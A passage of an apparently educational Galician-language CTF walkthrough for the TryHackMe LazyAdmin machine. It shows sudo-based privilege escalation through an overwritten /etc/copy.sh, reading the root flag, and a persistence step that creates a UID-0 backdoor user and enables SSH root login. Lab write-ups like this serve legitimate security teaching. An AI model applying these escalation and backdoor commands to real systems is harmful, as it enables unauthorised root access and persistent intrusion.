+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>ls<span class="w"> </span>-l<span class="w"> </span>/etc/copy.sh
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="nb">echo</span><span class="w"> </span>sh<span class="w"> </span>&gt;<span class="w"> </span>/etc/copy.sh
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>/usr/bin/perl<span class="w"> </span>/home/itguy/backup.pl
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>$<span class="w"> </span>whoami
+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>www-data
+</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>$<span class="w"> </span><span class="nb">exit</span>
+</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>sudo<span class="w"> </span>/usr/bin/perl<span class="w"> </span>/home/itguy/backup.pl
+</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a><span class="c1"># whoami</span>
+</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a>root
+</span></code></pre></div>
+<img alt="Fig. Persistencia nc profile" src="../images/lazyadmin-root.png" />    </p>
+<p>Xa somos <strong>root</strong>, co cal executamos:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>ls<span class="w"> </span>-l<span class="w"> </span>/root
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>cat<span class="w"> </span>/root/root.txt
+</span></code></pre></div></p>
+<p><strong>Xa obtemos a flag root.txt</strong>    </p>
+<hr />
+<p>Agora xa podemos subir os flags atopados a TryHackMe  <br />
+<img alt="Fig. Persistencia nc profile" src="../images/lazyadmin-flags-upload.png" /></p>
+<h3 id="fase-5-persistencia">Fase 5: Persistencia</h3>
+<div class="admonition note">
+<p class="admonition-title">Aínda que as Flags xa se conseguiron...</p>
+<p>Podemos intentar conseguir a Persistencia na máquina.</p>
+</div>
+<h4 id="engadir-usuario-permanente-e-ademais-facelo-root">Engadir usuario permanente e ademais facelo root</h4>
+<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>useradd<span class="w"> </span>-m<span class="w"> </span>pentester<span class="w"> </span>-o<span class="w"> </span>-u<span class="w"> </span><span class="m">0</span><span class="w"> </span>-g<span class="w"> </span><span class="m">0</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;pentester:abc123.&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>chpasswd
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>id<span class="w"> </span>pentester
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>sed<span class="w"> </span>-i<span class="w"> </span><span class="s1">&#39;s|PermitRootLogin prohibit-password|PermitRootLogin yes|&#39;</span><span class="w"> </span>/etc/ssh/sshd_config
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>reboot
+</span></code></pre></div>
+<img alt="Fig. Novo usuario root" src="../images/lazyadmin-persistencia-user-pentester.png" /></p>
+<p>Unha vez reiniciada a máquina vemos que podemos acceder mediante ssh co usuario root <code>pentester</code>  <br />
+<img alt="Fig. Novo usuario root" src="../images/lazyadmin-persistencia-user-pentester2.png" /></p>
+<hr />
+<h3 id="fase-6-informe-final">Fase 6: Informe final</h3>
+<p>Seguir o indicado en <a href="../../apuntamentos/informes" target="_blank">Informes de Pentesting</a> para obter os informes.</p>
+<div class="admonition tip">
+<p class="admonition-title">Exemplos nas seccións</p>
+<ul>
+<li><a href="../practicas-taller-metasploitable2/#fase-6-informe-final">Metasploitable 2</a>    </li>
+<li><a href="../practicas-taller-metasploitable3/#fase-6-informe-final">Metasploitable 3</a>  </li>
+<li><a href="../practicas-taller-vulnhub/#fase-6-informe-final">VulnHub</a>    </li>
+</ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Volver ao principio
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.copy", "content.code.select", "content.code.annotate", "navigation.tabs", "navigation.tabs.sticky", "navigation.top"], "search": "../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado no cortapapeis", "clipboard.copy": "Copiar no cortapapeis", "search.result.more.one": "1 m\u00e1is nesta p\u00e1xina", "search.result.more.other": "# m\u00e1is nesta p\u00e1xina", "search.result.none": "Sen resultados", "search.result.one": "1 resultado atopado", "search.result.other": "# resultados atopados", "search.result.placeholder": "Insira un termo", "search.result.term.missing": "Falta", "select.version": "Seleccionar version"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
+      
+        <script src="../../../js/medium-zoom.min.js"></script>
+      
+        <script src="../../../js/opera.js"></script>
+      
+        <script src="../../../js/zoom.js"></script>
+      
+    
+  </body>
+</html>
